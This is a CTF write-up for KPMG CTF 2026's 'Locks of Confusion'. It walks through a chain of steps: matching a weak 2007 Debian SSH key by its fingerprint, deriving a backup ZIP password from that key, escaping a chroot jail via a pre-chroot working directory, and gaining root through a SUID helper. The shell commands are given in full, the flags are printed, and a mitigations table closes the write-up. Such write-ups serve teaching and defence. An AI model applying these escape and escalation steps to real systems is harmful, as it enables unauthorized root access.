---
link: 'writeups/kpmg-ctf-2026/locks-of-confusion'
title: "Locks of Confusion - KPMG CTF 2026"
description: "Writeup for Locks of Confusion (Parts 1 & 2) from KPMG CTF 2026. Recovering a weak 2007-era SSH private key from a legacy system archive, then escaping a chroot jail via a misplaced working directory and a setuid helper binary."
date: 2026-10-25 11:52:00
categories:
  - [Writeups, KPMG CTF 2026]
tags:
  - KPMG-CTF-2026
  - Infrastructure
  - SSH
  - Weak Keys
  - Chroot Escape
  - Privilege Escalation
---

# KPMG CTF 2026 - Locks of Confusion

---

## Challenge Description

> An Internal Ops portal with inventory, tickets, DNS, and documentation. One of the servers is a Debian 4.0 legacy database replica from 2007 whose SSH keypair was never rotated. Find the key, unlock the backup, and escalate to root.

---

## Step 1 - Recon

The dashboard had several useful pages. The inventory page told us `legacy-03` was a Debian 4.0 (Etch) machine deployed in 2007, still running OpenSSL `0.9.8c-4` and OpenSSH `4.3p2-9`. That OpenSSL version is notable - it predates the Debian weak-key bug fix (CVE-2008-0166), which means any RSA keys generated on it came from a drastically reduced keyspace.

The tickets page had an entry about an SSH access issue for `svc-legacydb` after a 2011 migration. Looking at the HTML source of the ticket, there were two archive paths left in comments:

```plain
/archive/provisioning/legacy-03-2007.tar.gz
/archive/keyspace/legacy-keys-2007.tar.gz
```

![Archive paths in ticket HTML](/img/posts/kpmg-ctf-2026-12_loc_archive_paths.webp)

Hitting those paths redirected to `/verify`, a node-selection image challenge. After completing that in the browser the downloads worked in the same session.

---

## Step 2 - Extracting the Archives

```bash
tar -xzf legacy-03-2007.tar.gz
tar -xzf legacy-keys-2007.tar.gz
```

The provisioning archive had the deployed `authorized_keys` file and a `provision.log` confirming an unencrypted 2048-bit RSA key was generated for `svc-legacydb` back in 2007. The keyspace archive had 300 candidate PEM private keys.

The `README.txt` in the keyspace archive (a note from M. Reyes in infra) also pointed to a password-protected backup ZIP at `/archive/backups/e6f25638ae2ed6ba955cdae6a74c6798.zip` and explained how the password was derived from the matching key.

![Key and path info from README](/img/posts/kpmg-ctf-2026-13_loc_keys_path.webp)

---

## Step 3 - Finding the Matching Key

We fingerprinted the `authorized_keys` entry and compared it against each candidate:

```bash
target=$(ssh-keygen -lf legacy-03-2007/home/svc-legacydb/.ssh/authorized_keys | awk '{print $2}')

for key in legacy-keys-2007/privkey_*.pem; do
  fp=$(ssh-keygen -y -P '' -f "$key" 2>/dev/null | ssh-keygen -lf - 2>/dev/null | awk '{print $2}')
  [ "$fp" = "$target" ] && echo "MATCH: $key"
done
```

Match: `privkey_0137.pem`

![Found the matching private key](/img/posts/kpmg-ctf-2026-11_loc_found_privkey.webp)

Only 300 candidates were needed because the 2007 Debian OpenSSL bug made the RSA keyspace tiny.

---

## Step 4 - Unlocking the Backup ZIP (Flag 1)

The README said the ZIP password is the first 64 characters of the base64 body of the matching PEM file, with headers, footers, and line breaks stripped:

```bash
password=$(grep -v '^-----' legacy-keys-2007/privkey_0137.pem | tr -d '\n' | cut -c1-64)
unzip -P "$password" e6f25638ae2ed6ba955cdae6a74c6798.zip
```

![ZIP password derivation](/img/posts/kpmg-ctf-2026-14_loc_zip_password.webp)

The ZIP contained `user.txt` with the flag.

![Part 1 flag](/img/posts/kpmg-ctf-2026-10_loc_flag_part1.webp)

### Flag 1

```plain
KPMG_CTF{QkZ-FGqQZ9zMq1Z_jJ3RiuNp8ZfyNJebZTZ_U385U7UP}
```

---

## Step 5 - SSH Login to the Live Host (Part 2)

```sh
ssh -tt -p 26107 \
  -i privkey_0137.pem \
  -o IdentitiesOnly=yes \
  svc-legacydb@0.cloud.chals.io
```

Login worked but dropped us into a restricted BusyBox shell. `PATH` was set to `/nonexistent` so normal commands weren't found. We used BusyBox directly:

```sh
/bin/busybox id    # uid=1500
/bin/busybox ls
```

The shell also printed `sh: getcwd: No such file or directory` on every command. That error was the first clue that something was off about where the shell thought it was.

![SSH config check](/img/posts/kpmg-ctf-2026-15_loc2_ssh_config.webp)

---

## Step 6 - Understanding the Jail Setup

We used SFTP on the same port to inspect the filesystem and downloaded two SUID binaries from `/usr/local/bin`:

```sh
sftp -P 26107 -i privkey_0137.pem -o IdentitiesOnly=yes svc-legacydb@0.cloud.chals.io
```

| Binary | What it does |
|---|---|
| `jail_shell` | Does `chdir("/opt/diagnostics/landing")`, then `chroot("/opt/jail")`, drops to UID 1500, starts `/bin/sh` |
| `diag-recovery` | Calls `setgid(0)`, `setuid(0)`, then starts `/bin/sh` - effectively a root shell |

That explained everything. The login binary changes directory **before** calling `chroot`. After the chroot, the shell's working directory is still pointing to the pre-jail path on the real filesystem. The shell can't resolve it (hence `getcwd` error), but relative paths like `../../../` still traverse the real filesystem.

![SSH allows password auth](/img/posts/kpmg-ctf-2026-16_loc2_ssh_allows_password.webp)
![Passwd folder recon](/img/posts/kpmg-ctf-2026-17_loc2_passwd_folder.webp)

> [!IMPORTANT]
> You have to do the traversal before running `cd /`. Doing `cd /` would move the shell into the jail and lose that outside-jail starting point.

---

## Step 7 - Escaping and Getting Root

From a fresh SSH login, before doing anything else:

```sh
/bin/busybox chroot ../../../ /bin/sh
```

`../../../` walks back to the container's real root. We're out of the jail, still as `svc-legacydb`. Now we run the setuid helper:

```sh
/usr/local/bin/diag-recovery
/bin/id
# uid=0(root)

/bin/cat /root/root.txt
```

### Flag 2

```plain
KPMG_CTF{71INJZCHUi1zpL1dggZenlcyMHs6qh-NtW7ntKiKLBpo}
```

---

## Mitigations

| Vulnerability | Fix |
|---|---|
| Unrotated 2007 SSH keys | Regenerate all keypairs, enforce rotation policy |
| Archive paths in HTML comments | Strip debug artifacts before production |
| chroot escape via pre-chroot chdir | Use `pivot_root` or namespaces instead of `chroot` |
| Unrestricted SUID root helper | Audit and remove unnecessary SUID binaries |

---

## Summary

Part 1 used the Debian weak-key bug - keys generated in 2007 on that OpenSSL version came from a small enough keyspace that brute-forcing fingerprint matches across 300 candidates was trivial. Part 2 was a classic chroot escape: the login shell set the working directory outside the jail before calling chroot, so relative paths still reached the real filesystem. A root-owned SUID helper sitting on that same filesystem finished the job.
